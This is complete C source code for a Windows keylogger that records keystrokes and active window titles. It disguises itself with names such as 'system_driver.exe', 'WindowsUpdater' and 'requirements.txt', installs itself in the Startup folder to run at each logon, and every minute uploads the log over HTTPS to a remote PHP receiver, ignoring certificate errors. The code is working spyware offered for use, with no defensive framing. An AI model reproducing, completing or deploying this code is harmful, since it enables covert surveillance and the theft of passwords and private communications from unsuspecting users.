#define _WIN32_WINNT 0x0500 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <windows.h>
#include <wininet.h> 

// Fix pro chybu "UNLEN undeclared"
#ifndef UNLEN
#define UNLEN 256
#endif

// Odkaz na knihovny pro Visual Studio
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib") 

// --- KONFIGURATION  ---
#define SERVER ""        // ONLY DOMENA (bez https://)
#define SCRIPT_PATH "/receiver.php"     // Path to PHP script
#define LOG_FILE "requirements.txt"     // Local log name
#define UPLOAD_INTERVAL 60              // Upload every 60 seconds
// -------------------------------

#define TITLE_LEN 1024
#define KEY_BUF_LEN 255

// Funkce pro ziskani identifikace PC (JmenoPC-Uzivatel)
void getMachineID(char *buffer, int size) {
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    char userName[UNLEN + 1];
    DWORD size1 = sizeof(computerName);
    DWORD size2 = sizeof(userName);

    if (!GetComputerNameA(computerName, &size1)) strcpy(computerName, "UNKNOWN_PC");
    if (!GetUserNameA(userName, &size2)) strcpy(userName, "UNKNOWN_USER");

    snprintf(buffer, size, "%s-%s", computerName, userName);
}

// --- PERSISTENCE ---
void createShortcut(const char *sourcePath, const char *startupFolder, const char *linkName) {
    char vbsPath[MAX_PATH], linkPath[MAX_PATH], command[MAX_PATH + 50];
    snprintf(linkPath, sizeof(linkPath), "%s\\%s.lnk", startupFolder, linkName);
    snprintf(vbsPath, sizeof(vbsPath), "%s\\create_lnk.vbs", startupFolder);

    FILE *f = fopen(vbsPath, "w");
    if (f) {
        fprintf(f, "Set oWS = WScript.CreateObject(\"WScript.Shell\")\n");
        fprintf(f, "sLinkFile = \"%s\"\n", linkPath);
        fprintf(f, "Set oLink = oWS.CreateShortcut(sLinkFile)\n");
        fprintf(f, "oLink.TargetPath = \"%s\"\n", sourcePath);
        
        char workingDir[MAX_PATH];
        strcpy(workingDir, sourcePath);
        char *lastSlash = strrchr(workingDir, '\\');
        if (lastSlash) *lastSlash = '\0';
        
        fprintf(f, "oLink.WorkingDirectory = \"%s\"\n", workingDir);
        fprintf(f, "oLink.Save\n");
        fclose(f);

        snprintf(command, sizeof(command), "cscript //Nologo \"%s\"", vbsPath);
        system(command);
        remove(vbsPath);
    }
}

void installToStartup() {
    char myPath[MAX_PATH], destPath[MAX_PATH], startupPath[MAX_PATH];
    char *userProfile = getenv("USERPROFILE");
    char *appData = getenv("APPDATA");

    if (!userProfile || !appData) return;

    GetModuleFileNameA(NULL, myPath, MAX_PATH);
    snprintf(destPath, sizeof(destPath), "%s\\Documents\\system_driver.exe", userProfile);

    // Pokud uz bezime z cilove slozky, neinstalujeme znovu
    if (strcmp(myPath, destPath) == 0) return;

    CopyFileA(myPath, destPath, FALSE);
    snprintf(startupPath, sizeof(startupPath), "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", appData);
    createShortcut(destPath, startupPath, "WindowsUpdater");
}

// --- SÍŤOVÁ KOMUNIKACE ---
void uploadLog(const char *filepath) {
    FILE *f = fopen(filepath, "rb");
    if (!f) return;

    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    fseek(f, 0, SEEK_SET);

    if (fsize == 0) { fclose(f); return; }

    char *buffer = (char*)malloc(fsize + 1);
    if (!buffer) { fclose(f); return; }
    fread(buffer, 1, fsize, f);
    fclose(f);
    buffer[fsize] = 0;

    HINTERNET hInternet = InternetOpenA("DriverUpdater/2.1", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet) {
        HINTERNET hConnect = InternetConnectA(hInternet, SERVER, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (hConnect) {
            DWORD flags = INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", SCRIPT_PATH, NULL, NULL, NULL, flags, 0);
            if (hRequest) {
                // Pridani ID pocitace do hlavicky
                char machineID[256];
                getMachineID(machineID, sizeof(machineID));
                char headers[512];
                snprintf(headers, sizeof(headers), "Content-Type: text/plain\r\nX-ID: %s", machineID);

                if (HttpSendRequestA(hRequest, headers, strlen(headers), buffer, fsize)) {
                    f = fopen(filepath, "w"); if (f) fclose(f); // Smazani odeslaneho
                }
                InternetCloseHandle(hRequest);
            }
            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hInternet);
    }
    free(buffer);
}

// --- MAPOVANI KLAVES ---
void getKeyName(int key, char *buffer) {
    buffer[0] = '\0';
    switch (key) {
        case 8:  break; // Backspace ignorujeme
        case 9:  strcpy(buffer, "\t"); break;
        case 13: strcpy(buffer, "\n"); break;
        case 32: strcpy(buffer, " "); break;
        // Systemove klavesy ignorujeme
        case 1: case 2: case 16: case 17: case 18: case 27: case 91: case 20: break;
        // Znaky
        case 186: strcpy(buffer, ";"); break;
        case 187: strcpy(buffer, "+"); break;
        case 188: strcpy(buffer, ","); break;
        case 189: strcpy(buffer, "-"); break;
        case 190: strcpy(buffer, "."); break;
        case 191: strcpy(buffer, "/"); break;
        default:
            if (key >= 48 && key <= 57) sprintf(buffer, "%c", key);
            else if (key >= 65 && key <= 90) sprintf(buffer, "%c", key);
            else if (key >= 96 && key <= 105) sprintf(buffer, "%d", key - 96);
            break;
    }
}

// --- HLAVNI FUNKCE ---
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    installToStartup();

    char outputPath[MAX_PATH];
    char *userProfile = getenv("USERPROFILE");
    
    // Logy ukladame do Dokumentu
    if (userProfile) {
        snprintf(outputPath, sizeof(outputPath), "%s\\Documents\\%s", userProfile, LOG_FILE);
    } else {
        strcpy(outputPath, LOG_FILE);
    }

    // Pockame 5 sekund po startu
    Sleep(5000); 

    FILE *file = fopen(outputPath, "a");
    if (!file) return 1;

    char currentTitle[TITLE_LEN] = {0};
    char previousTitle[TITLE_LEN] = {0};
    char keyName[KEY_BUF_LEN] = {0};
    time_t lastUploadTime = time(NULL);

    while (1) {
        Sleep(10); 

        // Zjisteni okna
        HWND hwnd = GetForegroundWindow();
        if (hwnd) {
            GetWindowTextA(hwnd, currentTitle, TITLE_LEN - 1);
        } else {
            currentTitle[0] = '\0';
        }

        // Zapis nazvu okna, pokud se zmenilo
        if (strcmp(currentTitle, previousTitle) != 0) {
            strcpy(previousTitle, currentTitle);
            fprintf(file, "\n\n[WIN: %s]\n", currentTitle);
            fflush(file);
        }

        // Zapis klaves
        for (int i = 1; i < 255; i++) {
            if (GetAsyncKeyState(i) & 1) {
                getKeyName(i, keyName);
                if (strlen(keyName) > 0) {
                    fprintf(file, "%s", keyName);
                    fflush(file);
                }
            }
        }

        // Upload
        time_t now = time(NULL);
        if (now - lastUploadTime >= UPLOAD_INTERVAL) {
            fclose(file);
            uploadLog(outputPath);
            file = fopen(outputPath, "a");
            if (!file) return 1;
            lastUploadTime = now;
        }
    }
    return 0;
}
